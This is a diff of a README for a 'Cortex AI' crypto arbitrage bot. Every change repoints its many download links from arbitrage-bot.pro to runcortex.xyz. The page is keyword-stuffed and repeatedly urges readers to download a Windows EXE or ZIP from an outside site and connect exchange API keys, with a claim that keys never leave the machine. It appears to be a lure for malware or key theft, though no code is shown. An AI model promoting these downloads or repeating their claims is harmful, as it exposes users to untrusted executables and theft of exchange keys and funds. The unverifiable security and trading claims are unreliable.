@@ -17,13 +17,13 @@
 </p>
 
 <p align="center">
-  <a href="https://arbitrage-bot.pro/download.php">
+  <a href="https://runcortex.xyz/download.php">
     <img src="https://img.shields.io/badge/DOWNLOAD-🤖Cortex%20AI%20v3.4%20Stable-brightgreen?style=for-the-badge&logo=windows" alt="Download Cortex AI" width="350">
   </a>
 </p>
 
 <p align="center">
-  <a href="https://arbitrage-bot.pro/download.php">
+  <a href="https://runcortex.xyz/download.php">
     **DOWNLOAD OFFICIAL CORTEX AI CRYPTO ARBITRAGE BOT WINDOWS EXE**
   </a>
 </p>
@@ -50,13 +50,13 @@ Deploying the **automated trading software** infrastructure requires no external
 To launch the secure native production client environment and activate the **ai arbitrage bot** module:
 
 <p align="center">
-  <a href="https://arbitrage-bot.pro/download.php">
+  <a href="https://runcortex.xyz/download.php">
     <img src="https://img.shields.io/badge/DOWNLOAD-🤖Cortex%20AI%20v3.4%20Stable-brightgreen?style=for-the-badge&logo=windows" alt="Download Cortex AI">
   </a>
 </p>
 
 <p align="center">
-  <a href="https://arbitrage-bot.pro/download.php" style="font-weight: bold; font-size: 16px; color: #00ffa3; text-decoration: none;">
+  <a href="https://runcortex.xyz/download.php" style="font-weight: bold; font-size: 16px; color: #00ffa3; text-decoration: none;">
     DOWNLOAD COINBASE AND BINANCE BOT INFRASTRUCTURE STABLE ZIP
   </a>
 </p>
@@ -66,7 +66,7 @@ To launch the secure native production client environment and activate the **ai 
 3. **Core Syncing:** Connect exchange API keys locally to sync the **bybit bot** and **okx trading** pipelines. Hardware level memory encryption guarantees keys never leave your machine.
 
 <p align="center">
-  <a href="https://arbitrage-bot.pro/">
+  <a href="https://runcortex.xyz/">
     <img src="https://img.shields.io/badge/Official_Website-arbitrage--bot.pro-00E676?style=for-the-badge&logo=google-chrome&logoColor=white" alt="Cortex AI Official Website">
   </a>
   &nbsp;&nbsp;
@@ -139,16 +139,16 @@ A: Local order routing engines use an integrated **flash loan bot** algorithm to
 * **Disk Space:** 500 MB minimum uncompressed storage space.
 * **Network:** Low-jitter broadband connection for stable websocket telemetry.
 
----
+
 
 <p align="center">
-  <a href="https://arbitrage-bot.pro/download.php">
+  <a href="https://runcortex.xyz/download.php">
     <img src="https://img.shields.io/badge/DOWNLOAD-🤖Cortex%20AI%20v3.4%20Stable-brightgreen?style=for-the-badge&logo=windows" alt="Download Cortex AI" width="250">
   </a>
 </p>
 
 <p align="center">
-  <a href="https://arbitrage-bot.pro/download.php">
+  <a href="https://runcortex.xyz/download.php">
     **CLICK HERE TO DOWNLOAD THE FULLY AUTOMATED TRADING BOT COMPRESSED ARTIFACT**
   </a>
 </p>
